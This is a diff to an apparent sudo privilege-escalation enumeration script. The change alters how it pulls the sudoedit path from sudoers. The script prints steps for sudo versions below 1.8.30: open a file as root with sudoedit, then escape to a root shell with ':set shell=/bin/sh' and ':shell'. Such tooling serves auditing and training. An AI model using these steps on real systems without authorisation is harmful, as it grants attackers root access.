@@ -513,12 +513,14 @@ fi
   
 #####  Check for absolute path to sudoedit
 if [ "$cnver" -lt "1008030" ] ; then
-sudoeditpath=$(echo "$cmd" 2>/dev/null | grep -E "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit" | cut -d " " -f 7,8)
+sudoeditpathcmd=$(echo "$cmd" 2>/dev/null | grep -E "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit" | cut -d " " -f 7,8)
+sudoeditpath=$(echo "$cmd" 2>/dev/null | grep -Eo "(/bin/|/usr/bin/|/usr/local/bin/)sudoedit")
 if [ "$sudoeditpath" ]; then
   echo -e "${BOLD}${GREEN} [+] Absolute path to sudoedit was found in the sudoers file: ${RESET}"
   echo -e "[-] Privilege escalation is possible if the sudo version is < 1.8.30"
-  echo -e "[*] Run the command sudo $sudoeditpath <file> as below to invoke a file editor as root"
-  echo -e "$sudoeditpath"
+  echo -e "[*] Run the command sudo $sudoeditpath <file> to invoke a file editor as root"
+  echo -e "[*] where <file> is as below:"
+  echo -e "$sudoeditpathcmd"
   echo -e "[-] Once you are in the editor, type the following command in command mode to get a shell"
   echo -e "[-] Run command : :set shell=/bin/sh"
   echo -e "[-] :shell"
